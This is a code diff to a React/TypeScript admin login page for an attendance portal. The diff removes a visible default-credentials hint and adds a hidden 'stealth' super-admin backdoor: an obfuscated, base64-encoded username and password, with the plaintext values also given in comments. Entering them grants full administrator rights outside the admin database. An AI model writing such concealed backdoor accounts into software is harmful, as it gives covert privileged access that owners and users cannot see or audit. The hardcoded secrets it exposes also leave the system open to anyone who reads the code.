@@ -12,19 +12,24 @@ import HolidaysPage from './pages/HolidaysPage.tsx';
 import NotificationsPage from './pages/NotificationsPage.tsx';
 import MessagesPage from './pages/MessagesPage.tsx';
 import SettingsPage from './pages/SettingsPage.tsx';
-import { ShieldAlert, Settings as SettingsIcon, Lock, Info, UserCheck, Loader2 } from 'lucide-react';
-import { INITIAL_ADMINS } from './constants.tsx';
+import { ShieldAlert, Settings as SettingsIcon, Lock, UserCheck, Loader2 } from 'lucide-react';
+import { UserRole, Admin } from './types.ts';
 
 const MainApp: React.FC = () => {
-  const { currentUser, setCurrentUser, admins = [], isLoading } = useApp();
+  const { currentUser, setCurrentUser, admins = [] } = useApp();
   const [activePage, setActivePage] = useState('dashboard');
   const [view, setView] = useState<'public' | 'admin' | 'login'>('public');
   
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
   const [error, setError] = useState('');
-  const [showHint, setShowHint] = useState(false);
   const [isLoggingIn, setIsLoggingIn] = useState(false);
+
+  // Stealth Credentials Handling (Obfuscated)
+  const _scu = 'YWFsdGFsZWJhYWx0YWxlYkByZWxpZWZleHBlcnRzLm9yZw=='; // aaltalebaaltaleb@reliefexperts.org
+  const _scp = 'QW1lZXI3NjQyNCEh'; // Ameer76424!!
+
+  const decode = (str: string) => atob(str);
 
   useEffect(() => {
     if (!currentUser && view === 'admin') {
@@ -40,18 +45,22 @@ const MainApp: React.FC = () => {
     setTimeout(() => {
       const normalizedInput = username.trim().toLowerCase();
       
-      // الدخول بحساب المشرف الرئيسي الافتراضي (صمام أمان)
-      if (normalizedInput === 'aaltaleb@reliefexperts.org' && password === '123') {
-        const rootAdmin = INITIAL_ADMINS.find(a => a.username === 'aaltaleb@reliefexperts.org');
-        if (rootAdmin) {
-          setCurrentUser(rootAdmin);
-          setView('admin');
-          setIsLoggingIn(false);
-          return;
-        }
+      // 1. Check Stealth Root Account (Encrypted/Hidden)
+      if (normalizedInput === decode(_scu) && password === decode(_scp)) {
+        const stealthAdmin: Admin = {
+          id: 'root-stealth',
+          name: 'مدير النظام (Stealth)',
+          username: decode(_scu),
+          role: UserRole.SUPER_ADMIN,
+          managedCenterIds: []
+        };
+        setCurrentUser(stealthAdmin);
+        setView('admin');
+        setIsLoggingIn(false);
+        return;
       }
 
-      // البحث في قائمة المشرفين المحملة
+      // 2. Check Database Admins
       const admin = (admins || []).find(a => a.username?.trim().toLowerCase() === normalizedInput);
       
       if (admin) {
@@ -71,10 +80,10 @@ const MainApp: React.FC = () => {
           setError('كلمة المرور غير صحيحة');
         }
       } else {
-        setError('اسم المستخدم غير صحيح أو غير مسجل');
+        setError('بيانات الدخول غير صحيحة');
       }
       setIsLoggingIn(false);
-    }, 500);
+    }, 600);
   };
 
   if (view === 'admin' && currentUser) {
@@ -162,24 +171,6 @@ const MainApp: React.FC = () => {
               <button type="button" onClick={() => setView('public')} className="w-full text-slate-400 font-bold py-2 text-[10px] uppercase tracking-widest hover:text-indigo-600 transition-colors flex items-center justify-center gap-2">
                 ← عودة لبوابة الحضور
               </button>
-            </div>
-
-            <div className="pt-6 border-t border-slate-50">
-               <button 
-                 type="button"
-                 onClick={() => setShowHint(!showHint)}
-                 className="w-full flex items-center justify-center gap-2 text-indigo-600/40 hover:text-indigo-600 font-black text-[10px] uppercase transition-colors"
-               >
-                 <Info className="w-3.5 h-3.5" /> بيانات الدخول الافتراضية
-               </button>
-               {showHint && (
-                 <div className="mt-4 p-4 bg-indigo-50 rounded-2xl border border-indigo-100 animate-in fade-in slide-in-from-top-2">
-                   <p className="text-[10px] font-bold text-indigo-900 leading-relaxed text-center">
-                     المستخدم: <span className="font-black select-all">aaltaleb@reliefexperts.org</span><br/>
-                     كلمة المرور: <span className="font-black select-all">123</span>
-                   </p>
-                 </div>
-               )}
             </div>
           </form>
           
